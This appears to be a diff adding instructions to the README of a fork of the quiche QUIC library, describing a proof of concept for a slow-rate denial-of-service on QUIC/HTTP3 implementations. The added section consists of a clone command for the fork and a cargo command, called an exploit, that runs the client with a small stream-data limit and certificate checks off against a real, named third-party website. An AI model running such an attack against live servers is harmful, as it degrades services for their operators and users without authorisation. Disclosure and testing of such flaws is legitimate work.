@@ -1,3 +1,17 @@
+### How to build this PoC for Slowrate DoS on quic/http implementations:
+
+```bash
+ $ git clone --recursive https://github.com/Mephue/quiche-h3/
+```
+
+and then built and exploit using cargo:
+
+```bash
+ $ SSLKEYLOGFILE=keylog cargo run --bin quiche-client -- https://openlitespeed.org --max-stream-data 4200 --no-verify --wire-version 1
+```
+
+
+
 ![quiche](quiche.svg)
 
 [![crates.io](https://img.shields.io/crates/v/quiche.svg)](https://crates.io/crates/quiche)
